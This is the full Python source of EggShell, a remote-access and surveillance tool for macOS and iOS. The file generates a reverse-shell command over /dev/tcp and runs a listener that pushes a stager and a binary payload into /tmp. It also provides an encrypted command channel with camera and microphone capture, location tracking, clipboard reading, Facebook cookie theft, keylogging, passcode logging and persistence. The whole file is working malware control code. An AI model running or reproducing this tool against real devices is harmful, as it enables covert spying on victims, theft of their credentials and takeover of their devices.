#NeonEggShell 2.0.1
#Created By lucas.py 8-18-16
import os,base64,random,string,socket,sys,time,binascii
from Crypto import Random
from Crypto.Cipher import AES
from StringIO import StringIO
from threading import Thread

debug = 0
TERM = "EOF6D2ONE"
homeDir = os.getcwd()+"/"
UNDERLINE_GREEN = '\033[4;92m'
GREEN = '\033[1;92m'
WHITE = '\033[0;97m'
WHITEBU = '\033[1;4m'
RED = '\033[1;91m'
ENDC = '\033[0m'
COLOR_INFO = '\033[0;36m'
NES = '\033[4;32m'+"NES"+WHITE+"> "
BANNER_ART_TEXT = GREEN+"""
.---.          .-. .        . .       \\      `.
|             (   )|        | |     o  \\       `.
|--- .-.. .-.. `-. |--. .-. | |         \\        `.
|   (   |(   |(   )|  |(.-' | |     o    \\      .`
'---'`-`| `-`| `-' '  `-`--'`-`-          \\   .`
     ._.' ._.'                               `          """+RED+"""
 _._._._._._._._._._|"""+COLOR_INFO+"______________________________________________."+RED+"""
|_#_#_#_#_#_#_#_#_#_|"""+COLOR_INFO+"_____________________________________________/"+RED+"""
                    l
"""+WHITE+"\nVersion: 2.0.2\nCreated By Lucas Jackson (@neoneggplant)\n"+ENDC
BANNER_MENU_TEXT = WHITE + "-"*40 + "\n" + """ Menu:
    1): Start Server
    2): Start Multi Session
    3): Create Payload
    4): Exit
""" + WHITE + "-"*40
MENU = BANNER_ART_TEXT + "" + BANNER_MENU_TEXT + "\n" + NES

sessions = {}

OSX_BINARY = "resources/esplosx"
iOS_BINARY = "resources/esplios"
#LINUX_BINARY = "resources/esplinux"
nesProDylib = "resources/eggshellPro.dylib"
#MARK: AES Encryption

#A random encryption key is created every time eggshell.py is run
def createKey():
    if debug:
        return "12345678123456781234567812345678"
    chars = string.letters + string.digits + "*"
    return ''.join((random.choice(chars)) for x in range(32))

#generate key/define global
shellKey = createKey()
#binary key is used to decrypt the encrypted shell key, exists inside binaries as well
binaryKey = "spGHbigdxMBJpbOCAr3rnS3inCdYQyZV"

#PKCS7Encoding
class PKCS7Encoder(object):
    def __init__(self, k=16):
        self.k = k
    
    ## @param text The padded text for which the padding is to be removed.
    # @exception ValueError Raised when the input padding is missing or corrupt.
    def decode(self, text):
        nl = len(text)
        val = int(binascii.hexlify(text[-1]), 16)
        if val > self.k:
            raise ValueError('Input is not padded or padding is corrupt')
        
        l = nl - val
        return text[:l]
    
    ## @param text The text to encode.
    def encode(self, text):
        l = len(text)
        output = StringIO()
        val = self.k - (l % self.k)
        for _ in xrange(val):
            output.write('%02x' % val)
        return text + binascii.unhexlify(output.getvalue())

encoder = PKCS7Encoder()

#decrypt files that were sent from targets
def decryptFile(filein, fileout, password,fileSize, key_length=16):
    iv = "\x00" * 16
    aes = AES.new(password, AES.MODE_CBC, iv)
    
    print strinfo("decrypting file")

    #encodepadding
    in_file = open(filein,"rb")
    encryptedData = in_file.read()
    pad_text = encoder.encode(encryptedData)
    in_file.close()

    #decrypt,get length
    decryptedData = aes.decrypt(pad_text)
    dataSize = len(decryptedData)
    
    offset = dataSize - fileSize
    
    if offset < 0:
        print strinfo("error decrypting data :(")

    #write data subtracting the offset
    out_file = open(fileout,'a+b')
    out_file.write(decryptedData[:-offset])
    out_file.close()

#Our AES Encryption Class
class AESEncryption:
    def __init__(self, key=None, BS=None):
        self.key = key
        self.pkcs7 = PKCS7Encoder()
        self.BS = (BS if BS else None)
    
    def decode(self, encodedEncrypted, BS=16):
        if self.key is None:
            raise ValueError("key is required")
    
        BS = (self.BS if self.BS else BS)
        cipher = AES.new(self.key)
        
        decrypted = cipher.decrypt(base64.b64decode(encodedEncrypted))[:BS]

        for i in range(1, len(base64.b64decode(encodedEncrypted)) / BS):
            cipher = AES.new(self.key, AES.MODE_CBC,
                             base64.b64decode(encodedEncrypted)[(i - 1) * BS:i * BS])
            decrypted += cipher.decrypt(base64.b64decode(encodedEncrypted)[i * BS:])[:BS]

        return self.pkcs7.decode(decrypted)

    def encode(self, raw, BS=16):
        if self.key is None:
            raise ValueError("key is required")
                    
        BS = (self.BS if self.BS else BS)
                        
        cipher = AES.new(self.key)
        encoded = self.pkcs7.encode(raw)
        encrypted = cipher.encrypt(encoded)
                                    
        return base64.b64encode(encrypted)

#TODO: should really take out whitespace eventually
def encryptStr(string,key=shellKey):
    aesx = AESEncryption(key,16)
    length = len(string)
    result = ""
    x = 0
    while x < length:
        chunk = string[x:x+12]
        result += aesx.encode(chunk)
        x+=12
    return result


#MARK: String Formatting/Convenience
def strinfo(this):
    return COLOR_INFO+"[*]  " + WHITE + this

def bben(data):
    return base64.b64encode(data)

def bbde(data):
    return base64.b64decode(data)

#MARK: Interactive EggShell

#local commands

def showLocalHelp():
    print WHITEBU+"Local Commands:"+"\n"+ENDC
    showCommand("lls","list contents of local directory")
    showCommand("lcd","change local directories")
    showCommand("lpwd","get current local directory")
    showCommand("lopen","open local directory")
    showCommand("clear","clears terminal")
    print ""

def showCommand(cmd,desc):
    print cmd + " " * (15 - len(cmd)) + ": " + desc

def showHelp(CDA):
    if "i386" in CDA:
        showLocalHelp()
        print WHITEBU+"OS X Commands:"+"\n"+ENDC
        showCommand("ls","list contents of directory")
        showCommand("cd","change directories")
        showCommand("rm","delete file")
        showCommand("pwd","get current directory")
        showCommand("download","download file")
        showCommand("picture","take picture through iSight camera")
        showCommand("getpid","get process id")
        showCommand("openurl","open url through the default browser")
        showCommand("idletime","get the amount of time since the keyboard/cursor were touched")
        showCommand("getpaste","get pasteboard contents")
        showCommand("mic","record microphone")
        showCommand("brightness","adjust screen brightness")
        showCommand("getfacebook","attempt to retrieve facebook cookie")
        showCommand("exec","execute command")
        showCommand("encrypt","encrypt file")
        showCommand("decrypt","decrypt file")
        showCommand("persistence","attempts to connect back every 60 seconds")
        showCommand("rmpersistence","removes persistence")
        print ""
    if "arm" in CDA:
        showLocalHelp()
        print WHITEBU+"iOS Commands:"+"\n"+ENDC
        showCommand("ls","list contents of directory")
        showCommand("cd","change directories")
        showCommand("rm","delete file")
        showCommand("pwd","get current directory")
        showCommand("download","download file")
        showCommand("frontcam","take picture through front camera")
        showCommand("backcam","take picture through back camera")
        showCommand("getpid","get process id")
        showCommand("vibrate","make device vibrate")
        showCommand("alert","make alert show up on device")
        showCommand("say","make device speak")
        showCommand("locate","get device location")
        showCommand("respring","respring device")
        showCommand("setvol","set mediaplayer volume")
        showCommand("getvol","view mediaplayer volume")
        showCommand("isplaying","view mediaplayer info")
        showCommand("openurl","open url on device")
        showCommand("listapps","list bundle identifiers")
        showCommand("open","open app")
        showCommand("installpro","installs eggshellpro to device")
        print "\n"+WHITEBU+"eggshellPro Commands:"+"\n"+ENDC
        showCommand("lock","simulate lock button press")
        showCommand("wake","wake device from sleeping state")
        showCommand("home","simulate home button press")
        showCommand("doublehome","simulate home button double press")
        showCommand("play","plays music")
        showCommand("pause","pause music")
        showCommand("next","next track")
        showCommand("prev","previous track")
        showCommand("getpasscode","log successfull passcode attempts")
        showCommand("unlock","unlock with passcode") #there are ways to get around this, (alwaysunlock) tweak
        showCommand("keylog","log keystrokes") #not working inside apps...yet
        showCommand("keylogclear","clear keylog data")
        showCommand("locationservice","turn on or off location services")
        print ""

def lopen(command):
    if len(command.split()) == 1:
        print "Usage: lopen localdirectory"
    else:
        os.system('open ' + command.replace("lopen ",""))

def lls(command):
    if len(command.split()) == 1:
        os.system('ls')
    else:
        os.system('ls ' + command.replace("lls ",""))

def lcd(command):
    if len(command.split()) == 1:
        print "Usage: lcd localdirectory"
    else:
        try:
            os.chdir(command.split()[1])
        except:
            print strinfo("directory not found")

def lpwd():
    os.system('pwd')


#MARK: Interactive Shell

def initSHELL(name,conn,host,port,CDA):
    while 1:
        command = raw_input(name) #raw
        args = command.split() #split

        try: #fixed crash if you type " "
            v = args[0]
        except:
            continue
    
        if not command:
            continue
        
        #exclusive commands
        if "arm" in CDA:
            if args[0] == "alert":
                title = bben(raw_input("Set title: "))
                message = bben(raw_input("Set message: "))
                sendCMD(args[0] + " " + title + " " + message,conn)
                continue
        elif "i386" in CDA:
            if args[0] == "mic" and len(args) >= 2 and args[1] == "stop":
                conn.send(encryptStr(command))
                downloadFile(command,conn)
                continue

        if args[0] == "download" or args[0] == "picture" or args[0] == "frontcam" or args[0] == "backcam" or args[0] == "screenshot":
            downloadFile(command,conn)
        elif args[0] == "installpro":
            uploadFile(nesProDylib,"/Library/MobileSubstrate/DynamicLibraries/nespro.dylib",conn)
        elif args[0] == "help":
            showHelp(CDA)
        elif args[0] == "clear":
            os.system('clear');
        elif args[0] == "lopen":
            lopen(command)
            continue
        elif args[0] == "lls":
            lls(command)
            continue
        elif args[0] == "lcd":
            lcd(command)
            continue
        elif args[0] == "lpwd":
            lpwd()
            continue
        elif args[0] == "alert":
            title = bben(raw_input("Set title: "))
            message = bben(raw_input("Set message: "))
            sendCMD(args[0] + " " + title + " " + message,conn)
        elif args[0] == "back" and len(sessions) > 0:
            return
        elif args[0] == "exit":
            return -1
        else:
            sendCMD(command,conn)

def sendCMD(cmd,conn):
    conn.send(encryptStr(cmd))
    try:
        data = receiveString(conn)
        if data != "":
            print data
    except:
        print receiveString(conn)
        print "connection was reset"
        conn.close()
        exit()

def receiveString(conn):
#    try:
        aesx = AESEncryption(shellKey,16)
        data = ""
        while 1:
            data += conn.recv(2048)
            if not data:
                return "we fucked up"
            #terminator to notify when we are done receiving data
            #useful for getting however much data we want
            if TERM in data:
                data = data.replace(TERM,"")
                result = bbde(aesx.decode(data))
                if result == "-1":
                    result = "invalid command"
                return result
#    except:
#        return "error getting return value"


#MARK: File Transfers
def uploadFile(fileName,location,conn):
    #filedata
    f = open(fileName,"r")
    fileData = bben(f.read())
    f.close()
    
    #size
    print "File size = " + str(sys.getsizeof(fileData))
    #send cmd
    print "Installing dylib..."
    conn.send(encryptStr("installpro"))
    
    #send dylib
    length = len(fileData)
    result = ""
    x = 0
    chunkSize = 512
    while x < length:
        chunk = fileData[x:x+chunkSize]
        sendCMD(chunk,conn)
        x+=chunkSize

    sendCMD(TERM,conn)
    #get result
    print "Finished"


def downloadFile(command,conn):
    #send download command
    conn.send(encryptStr(command))
    args = command.split()
    
    #receive file size
    try:
        sizeofFile = int(receiveString(conn))
    except:
        print "oops, couldnt get file size"
        return
    if sizeofFile == -1:
        print "file does not exist"
        return
    elif sizeofFile == -2:
        print "thats a directory"
        return
    elif sizeofFile == -3:
        print "error taking photo :/"
        return
    print strinfo("file size: "+str(sizeofFile))

    #filename to write to
    filename = ""
    dateFormat = "%Y%m%d%H%M%S"
    if args[0] == "screenshot":
        filename = "screenshot"+time.strftime(dateFormat)+".jpeg"
    elif args[0] == "picture":
        filename = "isight"+time.strftime(dateFormat)+".jpeg"
    elif args[0] == "frontcam":
        filename = "frontcamera"+time.strftime(dateFormat)+".jpeg"
    elif args[0] == "backcam":
        filename = "backcamera"+time.strftime(dateFormat)+".jpeg"
    elif args[0] == "mic":
        filename = "mic"+time.strftime(dateFormat)+".aac"
    else:
        filename = command[9:]

    progress = 0
    file = open(homeDir+".tmpfile", "a+b")
    #read stream into file
    while 1:
        #TODO: there is a small chance EOF will be miss-aligned, need to fix this
        chunk = conn.recv(1024)
        progress += len(chunk)
        #Show progress
        if progress > sizeofFile:
            progress = sizeofFile
        sys.stdout.write("\r"+strinfo(WHITE+"Downloading "+filename+" ("+str(progress)+"/"+str(sizeofFile)+") bytes"))
        #write to file
        if TERM in chunk:
            print ""
            #replace our endoffile keyword
            chunk = chunk.replace(TERM,"")
            #write the remaining chunk
            file.write(chunk)
            file.close()
            #decrypt with our shell key, remove tmp file
            downloadedFile = open(filename,"wb")
            downloadedFile.close()
            decryptFile(homeDir+".tmpfile",filename,shellKey,sizeofFile)
            os.remove(homeDir+".tmpfile")
            print strinfo("Finished Downloading!")
            return
        else:
            file.write(chunk)

#MARK: Server Functions

def getip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM);s.connect(("192.168.1.1",80));host = s.getsockname()[0];s.close()
        return host
    except:
        return "127.0.0.1"

def singleServer(host,port):
    session = SessionHandler()
    session.listen(1,host,port)
    if initSHELL(session.name,session.conn,session.host,session.port,session.CDA) == -1:
        print strinfo("closing connection")
        session.conn.close
        time.sleep(0.5)

def promptHostPort():
    lhost = getip()
    lport = 4444
    hostChoice = raw_input("SET LHOST (Leave blank for "+lhost+")>")
    if hostChoice != "":
        lhost = hostChoice
    print strinfo("LHOST = " + lhost)
    portChoice = raw_input("SET LPORT (Leave blank for "+str(lport)+")>")
    if portChoice != "":
        lport = portChoice
    print strinfo("LPORT = " + str(lport))
    return [lhost,lport]

def promptServerRun(host,port):
    if raw_input(NES+"Start Server? (Y/n): ") == "n":
        return
    else:
        if raw_input(NES+"Multi Server? (y/N): ") == "y":
            bgserver = Thread(target = multiServer, args=(host,port))
            bgserver.daemon=True
            bgserver.start()
            time.sleep(0.01)
            multiServerController(port,bgserver)
            bgserver.join()
        else:
            singleServer(host,port)

#MARK: Menu Functions

def menuStartServer(): #1
    sp = promptHostPort()
    singleServer(sp[0],sp[1])

def menuStartMultiServer(): #2
    sp = promptHostPort()
    bgserver = Thread(target = multiServer, args=(sp[0],sp[1]))
    bgserver.daemon=True
    bgserver.start()
    time.sleep(0.01)
    multiServerController(sp[1],bgserver)
    bgserver.join()

def menuCreateScript(): #3
    sp = promptHostPort()
    print COLOR_INFO+"bash &> /dev/tcp/"+sp[0]+"/"+str(sp[1])+" 0>&1"+ENDC
    promptServerRun(sp[0],sp[1])

def menuExit(): #4
    exit()


#MARK: MultiServer
class SessionHandler:
    def __init__(self):
        self.name = ""
        self.conn = ""
        self.s = ""
        self.host = ""
        self.port = ""
        self.CDA = ""
    
    def listen(self,verbose,host,port):
        self.host = host
        self.port = port
        INSTRUCT_ADDRESS = "/dev/tcp/"+str(host)+"/"+str(port)
        INSTRUCT_BINARY_ARGUMENT = bben(encryptStr(str(host)+" "+str(port)+" "+shellKey,binaryKey))
        INSTRUCT_STAGER = 'com=$(uname -p); if [ $com != "unknown" ]; then echo $com; else uname; fi\n'
        
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(('0.0.0.0', int(port)))
        s.listen(1)
        if verbose:
            print strinfo("Listening on port "+str(port)+"...")
        
        #debugging
        if debug:
            conn, addr = s.accept()
            data = receiveString(conn)
            if data: #payload should return the name of the device and we will use that as our prompt
                name = UNDERLINE_GREEN + data.replace("\n","")+ENDC+GREEN+"> "+ENDC;
                #spawn our interactive shell
                self.name = name
                self.conn = conn
                CDA = "i386"
                s.close()
                return [name,conn,host,port,CDA]
        
        #SEND/RECEIVE ARCH
        conn, addr = s.accept()
        hostAddress = addr[0]
        if verbose:
            print strinfo("Connecting to "+hostAddress)
        conn.send(INSTRUCT_STAGER)
        CDA = conn.recv(128)

        #CHOOSE/SEND BINARY
        payload = ""
        preload = ""
        if "armv7l" in CDA:
            CDA = "Linux"
        
        if "i386" in CDA:
            if verbose:
                print strinfo("Detected OSX")
            binaryFile = open(OSX_BINARY, "rb")
            payload = binaryFile.read()
            binaryFile.close()
            preload = "rm /private/tmp/espl 2> /dev/null;cat >/private/tmp/espl;chmod +x /private/tmp/espl;/private/tmp/espl "+INSTRUCT_BINARY_ARGUMENT+" > /dev/null &\n"
        elif "arm" in CDA:
            if verbose:
                print strinfo("Detected iOS")
            binaryFile = open(iOS_BINARY, "rb")
            payload = binaryFile.read()
            binaryFile.close()
            preload = "rm /private/var/tmp/espl 2> /dev/null;cat >/private/var/tmp/espl;chmod +x /private/var/tmp/espl;/private/var/tmp/espl "+INSTRUCT_BINARY_ARGUMENT+" > /dev/null &\n"
        elif "Linux" in CDA:
            if verbose:
                print strinfo("Detected Linux, this isn't supported yet")
            conn.close()
            exit()
            return
            binaryFile = open(LINUX_BINARY, "rb")
            payload = binaryFile.read()
            binaryFile.close()
            preload = "rm /var/tmp/espl;cat >/var/tmp/espl;chmod +x /var/tmp/espl;/var/tmp/espl "+INSTRUCT_BINARY_ARGUMENT+" &\n"
        else:
            if verbose:
                print strinfo("device unrecognized")
                print CDA
            conn.close();

        
        if verbose:
            print strinfo("Waiting For Target...")
            print strinfo("Sending Payload")
        conn.send(preload)
        conn.send(payload)
        conn.close() #only one blink!
    
        if verbose:
            print strinfo("Waiting For Connection...")
        conn, hostAddress = s.accept()
        data = receiveString(conn)

        if data: #payload should return the name of the device and we will use that as our prompt
            name = UNDERLINE_GREEN + data.replace("\n","")+ENDC+GREEN+"> "+ENDC;
            #spawn our interactive shell
            self.name = name
            self.conn = conn
            self.CDA = CDA
            s.close()
            return [name,conn,host,port,CDA]

def multiServer(host,port):
    global eggsessions
    x = 1
    strinfo("Starting Background Multi Server on "+str(port)+"...")
    print "type \"help\" for MultiServer commands"
    while 1:
        sessions[x] = SessionHandler()
        sessions[x].listen(0,host,port)
        sys.stdout.write("\n\r"+COLOR_INFO+"[*]  " + WHITE+"Session "+str(x)+" opened | "+sessions[x].name.replace(UNDERLINE_GREEN,"").replace(GREEN,"")[:-10] + " " + sessions[x].conn.getpeername()[0] +
                         WHITE+"\n"+COLOR_INFO+"MultiSession"+WHITE+"> ")
        sys.stdout.flush()
        x += 1

def multiServerSessionInteract(args):
    if len(args) == 2:
        try:
            s = sessions[int(args[1])]
            if initSHELL(s.name,s.conn,s.host,s.port,s.CDA) == -1:
                multiServerSessionClose(args)
        except:
            print strinfo("Session not found")

def multiServerSessionClose(args):
    if len(args) == 2:
        x = int(args[1])
        try:
            s = sessions[x]
            s.conn.close()
            del sessions[x]
            print strinfo("Session closed")
        except:
            print strinfo("Session not found")

def multiServerListSessions():
    for key,value in sessions.iteritems():
        if value.name:
            print "Session [" + str(key) + "] | " + value.name.replace(UNDERLINE_GREEN,"").replace(GREEN,"")[:-10] + " " + value.conn.getpeername()[0]

#TODO: finish this function lol
def multiServerExit(bgserver):
    for key,value in sessions.iteritems():
        if value.name:
            try:
                s = sessions[key]
                s.conn.close()
            except:
                pass
    sessions.clear()
    bgserver.exit()


def multiServerHelp():
    print WHITEBU+"MultiSession Commands:"+"\n"+ENDC
    showCommand("interact","interact with session, Usage: interact (session number)")
    showCommand("close","close session, Usage: close (session number)")
    showCommand("sessions","list current active sessions")
    showCommand("back","go back to MultiSession menu from session")
    print ""

def multiServerController(port,bgserver):
    while 1:
        input = raw_input(WHITE+""+COLOR_INFO+"MultiSession"+WHITE+"> ")
        if not input:
            continue
        cmd = input.split()

        #commands
        if cmd[0] == "interact":
            multiServerSessionInteract(cmd)
        elif cmd[0] == "sessions":
            multiServerListSessions()
        elif cmd[0] == "close":
            multiServerSessionClose(cmd)
        elif cmd[0] == "help":
            multiServerHelp()
        elif cmd[0] == "exit":
            multiServerExit(bgserver)
            break
        else:
            print "invalid command"
    interactiveMenu()


#MARK: Main Menu functions

def interactiveMenu():
    ERROR = ""
    while 1:
        os.system('clear')
        option = raw_input(ERROR+MENU)
        choose = {
            "1" : menuStartServer,
            "2" : menuStartMultiServer,
            "3" : menuCreateScript,
            "4" : menuExit
        }
        try:
            choose[option]()
            os.system('clear')
        except KeyError:
            ERROR = ""
            if option != '':
                ERROR = "invalid option\n"

def main():
    interactiveMenu()

if __name__=="__main__":
    main()
